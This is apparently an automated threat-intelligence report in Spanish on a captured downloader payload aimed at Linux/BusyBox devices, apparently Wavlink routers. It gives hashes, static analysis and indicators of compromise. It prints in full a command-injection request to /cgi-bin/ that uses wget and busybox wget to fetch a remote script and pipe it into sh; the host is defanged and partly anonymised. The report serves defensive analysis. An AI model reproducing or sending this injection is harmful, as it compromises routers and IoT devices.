# 🧬 Payload Analysis

`91283012c7eeb6d09bf3c1095efbe385c7010753bc15198dff62eaa90728bb2f`

## 📌 Resumen

Texto ASCII de 235 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `cd /tmp`
2. `wget hxxp://91.92.40.XXX/wget.sh -O-`
3. `sh -s wavlink`
4. `busybox wget hxxp://91.92.40.XXX/wget.sh -O-`
5. `sh` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/91283012c7eeb6d09bf3c1095efbe385c7010753bc15198dff62eaa90728bb2f.md](../../../../../malware-like/oraculo/downloader/91283012c7eeb6d09bf3c1095efbe385c7010753bc15198dff62eaa90728bb2f.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:45:45.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `91283012c7eeb6d09bf3c1095efbe385c7010753bc15198dff62eaa90728bb2f`
- **MD5:** `6b777d8c7d2d8e33e8fed613ec693659`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 235 B |
| Entropía | 5.06 |
| Strings | 3 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
GET /cgi-bin/;cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s wavlink;busybox wget hxxp://91.92.40.XXX/wget.sh -O-|sh
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| ip | 190.179.168.XXX | static_analysis |
| ip | 91.92.40.XXX | static_analysis |
| command | GET /cgi-bin/;cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s wavlink;busybox wget hxxp://91.92.40.XXX/wget.sh -O-\|sh | strings |
| hash | 91283012c7eeb6d09bf3c1095efbe385c7010753bc15198dff62eaa90728bb2f | static_analysis |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
